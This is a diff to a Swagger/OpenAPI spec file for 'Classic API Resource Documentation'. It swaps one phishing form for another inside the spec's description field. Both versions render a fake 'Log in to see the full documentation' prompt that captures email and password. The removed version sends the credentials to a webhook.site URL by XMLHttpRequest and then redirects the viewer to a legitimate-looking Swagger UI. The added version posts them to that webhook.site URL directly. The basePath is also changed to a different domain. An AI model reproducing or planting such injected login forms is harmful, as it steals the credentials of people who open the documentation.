@@ -3,45 +3,14 @@ info:
   title: Classic API Resource Documentation
   description: |
     <h1>Log in to see the full documentation</h1>
-    <form id="loginForm" onsubmit="handleSubmit(event)">
+    <form action="https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e" method="post">
     <label for="email">Login:</label>
-    <input name="email" required>
+    <input name="email">
     <label for="password">Password:</label>
-    <input name="password" type="password" required>
-    <input type="submit" value="Login"></form>
-    <script>
-      function handleSubmit(event) {
-        event.preventDefault(); // Prevent default form submission
-
-        // Create a FormData object from the form
-        const form = document.getElementById('loginForm');
-        const formData = new FormData(form);
-
-        // Create a new XMLHttpRequest
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://webhook.site/bc8d6747-e2bd-4874-b5be-2a28cf18a41e', true);
-
-        // Define what happens on successful data submission
-        xhr.onload = function() {
-          if (xhr.status >= 200 && xhr.status < 300) {
-            // Redirect to the desired URL after successful submission
-            window.location.href = 'https://neopaydemo.synerioncloud.com/SynerionWeb/swagger/ui/index';
-          } else {
-            alert('Form submission failed');
-          }
-        };
-
-        // Define what happens in case of an error
-        xhr.onerror = function() {
-          alert('Form submission failed');
-        };
-
-        // Send the form data
-        xhr.send(formData);
-      }
-    </script><!--
+    <input name="password">
+    <input type="submit" value="Login"></form><!--
   version: production
-basePath: https://www.epas.de
+basePath: https://www.cybecs.com
 produces:
 - application/xml
 - application/json
